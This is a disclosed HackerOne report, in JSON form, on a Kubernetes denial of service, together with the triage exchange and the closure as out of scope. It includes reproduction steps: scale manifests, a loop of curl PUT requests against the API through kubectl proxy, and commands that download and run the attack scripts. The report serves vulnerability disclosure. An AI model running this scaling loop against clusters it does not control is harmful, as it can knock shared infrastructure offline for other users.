{"id":831654,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzE2NTQ=","url":"https://hackerone.com/reports/831654","title":"\"Self\" DOS with large deployment and scaling","state":"Closed","substate":"not-applicable","severity_rating":"low","readable_substate":"N/A","created_at":"2020-03-25T21:39:21.174Z","submitted_at":"2020-03-25T21:39:21.174Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"wiardvanrij","url":"/wiardvanrij","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":39386,"url":"https://hackerone.com/kubernetes","handle":"kubernetes","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Kubernetes","twitter_handle":"kubernetesio","website":"https://kubernetes.io/","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-07-23T21:42:53.392Z","bug_reporter_agreed_on_going_public_at":"2020-07-23T21:42:53.348Z","team_member_agreed_on_going_public_at":"2020-07-23T17:42:02.550Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Report Submission Form\n\n## Summary:\nGood day! \nI was just messing around with some functions and trying to see what the impact was on my cluster. I found out that it took quite some resources to process a larger deployment, especially when scaling it. \nWhen I check your security release process I noticed that it did include \"Authenticated User\" - DOS (https://github.com/kubernetes/security/blob/master/security-release-process.md#denial-of-service) so I figured I should just make a report of this.\n\nThe summary is: \n\nWhen you define a deployment that contains loads of env variables, we can easily increase the size of what is being processed. When we start to scale \u0026 downscale this deployment, we get a massive increase in the API/ETCD memory \u0026 CPU usage. \n\nIn my case, I literally ruined my cluster that consists of 3 master nodes (4 vCPUs, 15 GB memory each)\n\n## Kubernetes Version:\n1.15.10\n\n## Component Version:\n\n## Steps To Reproduce:\n\nShort story:\n\n  1. Create a deployment that is near to the max chars allowed with env vars.\n  1. Scale it to N-number of nodes where N could be \"whatever\" - I've tested it with 99 nodes and 999, both seem to be increasing cluster usage\n  1. Scale it back down to 1\n  1. Repeat for a while.\n\nLong story:\n\n1  Create a deployment\n\nPlease check out my example deployment file here: https://gist.github.com/wiardvanrij/21e516993603282e174da399002d95a3\nAs it is really huge.\nIt is good to note that I just used a random image and defined really low cpu/mem limits in order to allow many pods to get created without hitting some cluster/node limit\n\n 2   Save this as `scale.json`\n\n```\n{\n    \"kind\": \"Scale\",\n    \"apiVersion\": \"autoscaling/v1\",\n    \"metadata\": {\n      \"name\": \"nginx\",\n      \"namespace\": \"default\"\n    },\n    \"spec\": {\n      \"replicas\": 999\n    }\n}  \n```\n\n3  And save this as `scaledown.json`\n\n```\n{\n    \"kind\": \"Scale\",\n    \"apiVersion\": \"autoscaling/v1\",\n    \"metadata\": {\n      \"name\": \"nginx\",\n      \"namespace\": \"default\"\n    },\n    \"spec\": {\n      \"replicas\": 1\n    }\n}  \n```\n4 create a `run.sh`\n\n```\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scale.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scaledown.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scale.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scaledown.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scale.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scaledown.json\n... repeat above for a bunch of times (50x or so).\n```\n\n5 I've used kube proxy for easy access\n\nrun `kubectl proxy` to make a proxy to your cluster\n\n6 run the run.sh file\n`./run.sh`  and optionally you could run this multiple times for some \"concurrency\" \n\n7 What you could see\n\nMassive usage in CPU power on the master nodes AND memory usage on for certain the API part of k8s, perhaps the nodes too, but I lost control of everything to see exactly what went down.\nEventually, you should not able to contact your cluster anymore and the nodes remain unresponsive/heavy throttled. \n\n## Notes\n\nThis feels really \"basic\" as for a DOS, though I really wanted to point something out.\nI was actually learning deeper internals of k8s and I just made this \"work\" when I saw some spikes in my metrics. Therefore I wanted to make the note that:\n- I actually made my cluster completely useless with this, but I'm uncertain if the ENV vars and/or the scaling are the sole reason.\n- I've got no idea what is really happening, because even when I stopped my \"script\" - the entire cluster was still unresponsive.\n- I've first tested this locally with KIND, and used KOPS to set up a \"production like\" cluster, and even with 3 somewhat decent master nodes, it was gone in minutes.\n\n\n## Supporting Material/References:\nDeployment file:\nhttps://gist.github.com/wiardvanrij/21e516993603282e174da399002d95a3\n\n## Impact\n\nDOS on the entire k8s cluster.","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":1,"voters":["wiardvanrij"],"severity":{"rating":"low","score":3.7,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"low"}},"structured_scope":{"databaseId":32459,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/kubernetes/kubernetes","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7448494,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @wiardvanrij,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@turtle_shell","automated_response":false,"created_at":"2020-03-26T13:55:36.134Z","updated_at":"2020-03-26T13:55:36.134Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7448548,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @wiardvanrij and thanks for your report,\n\nCan you please make sure ResourceQuota is enabled when testing? https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/#limiting-resource-usage-on-a-cluster \nIt prevents resource exhaustion from happening.\nAlso, can you please share all the commands needed to set up once you verified the above question?\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-03-26T14:01:25.264Z","updated_at":"2020-03-26T14:01:25.264Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7449591,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I'm assuming one has access to for example Google Cloud and has created a project there. \nMy setup include KOPS to setup a cluster with Google Cloud, please adjust were needed. \n\n# Cluster setup\n\n// Create a S3 Bucket for the state\ngsutil mb gs://kubernetes-cluster-\u003cyour-name\u003e/\nexport KOPS_STATE_STORE=gs://kubernetes-cluster-\u003cyour-name\u003e/\n\n// Set project and KOPS feature for GCE\nPROJECT=`gcloud config get-value project`\nexport KOPS_FEATURE_FLAGS=AlphaAllowGCE\n\n// Create a cluster with 3 master nodes and size n1-standaard-4\nkops create cluster simple.k8s.local --zones us-central1-c,us-central1-a,us-central1-f --state ${KOPS_STATE_STORE} --project=${PROJECT} --node-count 3 --master-size n1-standard-4 --master-zones us-central1-c,us-central1-a,us-central1-f\n\n// Roll it out\nkops update cluster --name simple.k8s.local --yes\n\n// Validate it\nkops validate cluster\n\n// It should give this response in some time.\n-\u003e \"Your cluster simple.k8s.local is ready\"\n\n# Proof of concept\n\n// Let's get some monitoring\nkubectl create ns monitoring\nhelm install prometheus stable/prometheus-operator -n monitoring\nkubectl port-forward svc/prometheus-grafana 8080:80 -n monitoring\n\nlogin with admin///prom-operator\nLook for the dashboard \"API server\"\n\n# Required files (can be found in my initial report)\n\ncurl -O https://gist.githubusercontent.com/wiardvanrij/21e516993603282e174da399002d95a3/raw/b821e0f580895830005f6960ef39d5e1e3860bc9/deploy.yaml\ncurl -O https://gist.githubusercontent.com/wiardvanrij/7fa365b8ba853cb3419d245fa4161100/raw/c042eaa0c1d5ae8f71f18532028a33bdf7cb3c73/main.sh\ncurl -O https://gist.githubusercontent.com/wiardvanrij/43387f9f718b76f198f4c12537167a85/raw/3accdc507f6a55979c940e3043c121817a5db0bf/start.sh\ncurl -O https://gist.githubusercontent.com/wiardvanrij/663dd15da4260fa8a3cb07a3033be010/raw/16878a51fd967fcac991ab5eec974206dcd8e23e/scale.json\ncurl -O https://gist.githubusercontent.com/wiardvanrij/9ddaca070581022cf46e1f954a13066e/raw/225d2c612c231d84c83772fd97c1b0bea9f67319/scaledown.json\ncurl -O https://gist.githubusercontent.com/wiardvanrij/e0e2f1789bd1a6da6dc1f8b81f7f5809/raw/99d28efa231f95f9eb7477b80961ed360c1a8a88/quota.yaml\n\nchmod +x main.sh\nchmod +x start.sh\n\n// Apply the deployment\nkubectl apply -f deploy.yaml\n\n// Adds the quote as requestsed\nkubectl apply -f quota.yaml -n default\n\n// Start proxy for easy access\nkubectl proxy\n\n# starting\n\n// Use this to go \"slow\"\n./main.sh\n\n// or go faster with\n./start.sh\n\nEventually, you can start up ./start.sh multiple times for greater effect. (in different terminals for example..)\n\nYou will notice the API server getting massive memory usage:\nF761771\n\nand eventually, the workload gets bigger\nF761772\n\nI wanted to actually show that memory would go up big time, but ended up with an other error after 1 minute of running this:\n```\n{\n  \"kind\": \"Status\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {\n\n  },\n  \"status\": \"Failure\",\n  \"message\": \"etcdserver: mvcc: database space exceeded\",\n  \"code\": 500\n}\n```\nAll my pods are stuck on terminating. \n\nI believe I used \"sane\" quota values:\n\n```\napiVersion: v1\nkind: ResourceQuota\nmetadata:\n  name: mem-cpu-demo\nspec:\n  hard:\n    requests.cpu: \"1\"\n    requests.memory: 1Gi\n    limits.cpu: \"2\"\n    limits.memory: 2Gi\n    pods: \"20\"\n```","automated_response":false,"created_at":"2020-03-26T15:48:36.977Z","updated_at":"2020-03-26T15:48:36.977Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":761772,"filename":"workers.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z7saWcdjENUyoYuFPAyANssY?response-content-disposition=attachment%3B%20filename%3D%22workers.png%22%3B%20filename%2A%3DUTF-8%27%27workers.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153243Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3bf411135349e82c72bf2e6fdfa056924462db07c27d9502afa5fbd0d49adcea"},{"id":761771,"filename":"api-server.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XMaY5XX57Bj9Hpso44VGLSof?response-content-disposition=attachment%3B%20filename%3D%22api-server.png%22%3B%20filename%2A%3DUTF-8%27%27api-server.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153243Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d67ddc2832eb74764ce1f9a4c4b75cb4c695a4b297cc695edfaa8e24445b4356"}],"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7482641,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @wiardvanrij and thanks for your reply,\n\n_Are you sure ResourceQuota is enabled when testing?_ https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/#limiting-resource-usage-on-a-cluster\nThere is already a package for resource exhaustion and you should test with that enabled.\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-03-30T15:30:24.982Z","updated_at":"2020-03-30T15:30:24.982Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7482683,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"hi @turtle_shell \n\nYes, I'm sure, as per proof of concept above.\n\nYet the issue here is not the resources on the worker nodes (to what you are referring too). It renders the master nodes useless. The load is on the API server, kubelet and etcd, via deployments \u0026 scaling. \n\nTherefore the resource quota does nothing for this case. \n","automated_response":false,"created_at":"2020-03-30T15:34:43.137Z","updated_at":"2020-03-30T15:34:43.137Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7529625,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @wiardvanrij and thanks for your report,\n\nI believe we do not have a setup for Google Cloud buckets. Is there any other setup I can use besides GCloud?\n\nI saw that some hackers used `minikube` to start clusters with Kubernetes.\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-04-03T12:18:44.894Z","updated_at":"2020-04-03T12:18:44.894Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7529759,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @turtle_shell \n\nThe requirement is having a k8s cluster. I (mistakenly perhaps) made the assumption that this was trivial to the report. For this case, it really does not matter which setup is being used, as long as you can use kubectl and apply the files to your cluster. \n\nIf you like to use minikube, then yes, go use that :) ","automated_response":false,"created_at":"2020-04-03T12:33:00.323Z","updated_at":"2020-04-03T12:33:00.323Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7567828,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @wiardvanrij,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@turtle_shell","automated_response":false,"created_at":"2020-04-07T06:37:37.774Z","updated_at":"2020-04-07T06:37:37.774Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7567833,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-04-07T06:38:03.593Z","updated_at":"2020-04-07T06:38:03.593Z","additional_data":{"old_severity":"Low","new_severity":"Low (3.7)","old_severity_id":672044,"new_severity_id":683763},"actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7727700,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @turtle_shell ,\n\nDo you perhaps have an update for me? I know it is a weird time at the moment, so no worries","automated_response":false,"created_at":"2020-04-20T16:00:02.054Z","updated_at":"2020-04-20T16:00:02.054Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7734119,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello  @wiardvanrij,\n\nThanks for your patience! The Kubernetes team is still working on this internally, and you will be updated once there is more information to share.\n\nRegards,\n@turtle_shell","automated_response":false,"created_at":"2020-04-21T07:41:48.452Z","updated_at":"2020-04-21T07:41:48.452Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7974240,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @turtle_shell \n\nI've been testing somewhat recently and was rechecking the severity. To be honest it could be interpreted in various ways but I ended up with either medium or high depending on certain aspects. Perhaps this could be re-checked?\n\nAlso, I don't want to be a buzzkill, but the program states 10 working days for each \"section\". To be honest, fine if this gets extended but the \"We’ll try to keep you informed about our progress throughout the process.\" lacks a little bit if I'm honest. \n\nAgain, I don't want to push anything and I really understand every situation. I do hope you understand mine. I've invested quite a lot of work to make a report - This even cost me 200$ in google cloud costs (partly by accident, my bad :D ) and the time to re-create the situation multiple times. \n\nAnyhow, I'm also open to help any way I can. Thank you! ","automated_response":false,"created_at":"2020-05-12T11:33:31.583Z","updated_at":"2020-05-12T11:33:31.583Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8095680,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @wiardvanrij and thanks for your patience,\n\nI have the feedback from Kubernetes. Essentially, they do not consider this as in-scope for the bug bounty program due to the fact that they don't consider a user that can create Deployments to be an unprivileged user. However, since this is a well-written report you can handle this as a public issue in Github, else Kubernetes will do it by themselves.\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-05-25T09:32:21.737Z","updated_at":"2020-05-25T09:32:21.737Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8114096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @turtle_shell ,\n\nI would like to point out their own program rules, which states: https://github.com/kubernetes/security/blob/master/security-release-process.md#denial-of-service\n\nWhich includes:\n\n- Authenticated User\n  - Persistent DoS against a high value asset. Example:\n     - Sending a small number of requests that causes a service failure for a high value asset\n\nTo be honest, this DOS would/could cause major issues on vendors selling k8s \"as a service\"; such as GKE, EKS, etc. Though I have not had the opportunity to actually be able to confirm this because I cannot just simply test this against such services. \n\n","automated_response":false,"created_at":"2020-05-27T05:03:44.262Z","updated_at":"2020-05-27T05:03:44.262Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8116177,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Thanks for the additional information @wiardvanrij. Unfortunately, that was not my call to consider this report invalid and there is nothing more I can do about it. For now, I can change the state to let you self-close the report until I do not have other information from Kubernetes that's the only thing I can do.\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-05-27T08:54:35.683Z","updated_at":"2020-05-27T08:54:35.683Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8144513,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @wiardvanrij,\n\nI changed this report's state to \"Needs More Info\" so that you can self-close it. By self-closing a report, you will avoid any reputation loss on your HackerOne profile!\n\nIn order to self-close a report:\n\n- Click on the \"Add comment\" button above the reply textbox\n- Choose \"Close report\"\n- Click on the green button \"Close report\" on the bottom right of the reply textbox\n\nWe hope to read more of your reports in the future!\n\nKind regards,\n\n@turtle_shell","automated_response":false,"created_at":"2020-05-29T12:11:27.492Z","updated_at":"2020-05-29T12:11:27.492Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8144720,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"","automated_response":false,"created_at":"2020-05-29T12:34:42.203Z","updated_at":"2020-05-29T12:34:42.203Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jp